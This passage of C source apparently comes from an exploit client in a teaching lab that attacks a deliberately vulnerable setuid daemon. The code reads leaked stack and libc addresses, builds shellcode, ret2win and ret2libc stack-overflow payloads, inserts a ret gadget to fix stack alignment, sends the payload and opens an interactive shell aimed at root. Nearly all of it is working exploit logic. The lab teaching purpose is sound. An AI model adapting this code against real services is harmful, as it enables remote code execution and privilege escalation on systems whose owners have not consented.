    printf("foosc: win_root()         = %#lx\n", bi.win_root_addr);
    long rbp_off_as_signed = -(long)bi.frame_off;
    printf("foosc: buf is at rbp%+ld, so the saved RIP is %lu bytes in\n",
           rbp_off_as_signed, bi.rip_off);
    printf("foosc: ret gadget         = %#lx\n", bi.ret_gadget);
    printf("foosc: our libc base      = %#lx\n", li.base);

    /* Decide whether we want the interactive shell by default. */
    if (strcmp(tech, "demo") == 0 || strcmp(tech, "leak") == 0) {
        is_leak = (strcmp(tech, "leak") == 0);
        if (want_shell == -1) want_shell = 0;
    } else if (want_shell == -1) {
        want_shell = 1;
    }

    /* ---- Phase 2: connect and read what the daemon tells us. ----------- */
    fd = connect_to(host, port);
    if (fd < 0)
        return 1;

    {
        const char *pats[4] = { "ids=", "stack=", "libc=", "BUF=" };
        if (read_until(fd, pats, 4, rx, sizeof(rx)) < 0)
            fprintf(stderr, "foosc: warning: incomplete banner/leak text\n");
    }

    if (parse_leaks(rx, &lk) < 0) {
        close(fd);
        return 1;
    }

    printf("foosc: daemon banner (ids=euid/ruid):\n----\n%s----\n", rx);
    printf("foosc: target euid=%d ruid=%d\n", lk.euid, lk.ruid);

    /*
     * THE SUID CHECK. If euid is not 0, foosd is not setuid-root and there
     * will be no root shell no matter how cleanly the payload lands. Say so
     * loudly now, so a "non-root shell" later is not mistaken for a broken
     * exploit. (Note: a non-root shell is still RCE, just not privilege
     * escalation -- the two are worth distinguishing in your head too.)
     */
    if (lk.euid != 0) {
        fprintf(stderr,
                "\nfoosc: WARNING: the daemon is NOT running with euid 0.\n"
                "       The payload will still land, but the shell will be\n"
                "       a plain user shell, not root.\n"
                "       Fix:  sudo make setuid\n"
                "       then restart foosd.\n\n");
    } else {
        printf("foosc: target is running setuid-root; a shellcode session\n"
               "       (or ret2win-root) should yield uid=0(root).\n");
    }

    printf("foosc: leaked stack ptr  = %#lx\n", lk.stack);
    printf("foosc: leaked libc read  = %#lx\n", lk.libc_read);
    printf("foosc: leaked buf        = %#lx\n", lk.buf);

    if (is_leak) {
        printf("foosc: leak mode -- not sending a payload.\n");
        close(fd);
        return 0;
    }

    /* ---- Phase 3: build the payload. ---------------------------------- */
    if      (strcmp(tech, "shellcode") == 0)   build_shellcode(&p, &bi, &lk);
    else if (strcmp(tech, "ret2win") == 0)      build_ret2win(&p, &bi);
    else if (strcmp(tech, "ret2win-root") == 0) build_ret2win_root(&p, &bi);
    else if (strcmp(tech, "ret2libc") == 0)     build_ret2libc(&p, &bi, &li, &lk);
    else if (strcmp(tech, "demo") == 0)         build_demo(&p, &bi);
    else {
        fprintf(stderr, "foosc: unknown technique '%s'\n", tech);
        close(fd);
        return 2;
    }

    if (p.len == 0) {
        fprintf(stderr, "foosc: payload is empty -- aborting\n");
        close(fd);
        return 1;
    }

    if (verbose) {
        printf("foosc: payload is %zu bytes; the last 16 are:\n  ", p.len);
        size_t start = p.len > 16 ? p.len - 16 : 0;
        for (size_t i = start; i < p.len; i++)
            printf("%02x ", p.data[i]);
        printf("\n");
    }

    /*
     * ------------------------------------------------------------------
     * STACK ALIGNMENT -- the subtlest bug in this whole lab.
     * ------------------------------------------------------------------
     * The System V AMD64 ABI requires %rsp to be 16-byte aligned on entry
     * to a function. A normal `call`/`ret` pair preserves this for free; a
     * hijacked bare `ret` hands the callee %rsp = buf + rip_off, which here
     * is 8 mod 16 (buf is 16-aligned by the ABI, rip_off is even but not a
     * multiple of 16). glibc is compiled with SSE2, and movaps faults on a
     * misaligned operand. The kernel then reports an alignment fault -- with
     * NO faulting address, i.e. si_addr == 0 -- which is the tell that the
     * crash is not a NULL dereference at all.
     *
     * FIX: insert one extra `ret` between the padding and the real target.
     * A ret adds exactly 8 to %rsp, restoring the invariant. (The shellcode
     * technique does not strictly need this -- our payload makes no stack
     * alignment assumptions -- but inserting it is harmless and keeps the
     * code uniform.)
     *
     * The `ret` must be INSERTED at rip_off, not appended at the end: an
     * appended ret is never reached because the first ret already lands on
     * the target. (That was the broken first version of this code.)
     * ------------------------------------------------------------------
     */
    if (strcmp(tech, "demo") == 0) {
        /* demo jumps to a deliberately invalid address; no callee. */
    } else if (bi.ret_gadget != 0 && (bi.rip_off % 16) == 8) {
        unsigned char *fixed;
        size_t head = bi.rip_off;

        if (head > p.len) {
            fprintf(stderr, "foosc: payload is shorter than rip_off\n");
            free(p.data);
            close(fd);
            return 1;
        }

        fixed = malloc(p.len + 8);
        if (fixed == NULL) {
            fprintf(stderr, "foosc: out of memory building alignment fix\n");
            free(p.data);
            close(fd);
            return 1;
        }
        memcpy(fixed, p.data, head);                    /* the padding       */
        memcpy(fixed + head, &bi.ret_gadget, 8);         /* the extra `ret`   */
        memcpy(fixed + head + 8, p.data + head, p.len - head);

        free(p.data);
        p.data = fixed;
        p.cap  = p.len + 8;
        p.len += 8;

        printf("foosc: inserted a `ret` (at %#lx) at offset %lu to restore "
               "16-byte alignment\n", bi.ret_gadget, head);
    }

    /* ---- Phase 4: send it and hand over. ------------------------------ */
    printf("foosc: sending %zu bytes (offset to RIP is %lu)\n",
           p.len, bi.rip_off);
    if (send_all(fd, p.data, p.len) < 0) {
        fprintf(stderr, "foosc: send failed: %s\n", strerror(errno));
        close(fd);
        return 1;
    }

    free(p.data);

    if (!want_shell) {
        usleep(400000);
        drain_hint(fd);
        printf("foosc: done (no shell requested)\n");
        close(fd);
        return 0;
    }

    /* The daemon echoes the first 64 bytes of our payload back before it
     * returns; swallow that so it does not look like shell output. */
    usleep(200000);
    drain_hint(fd);

    become_shell(fd);

    return 0;
}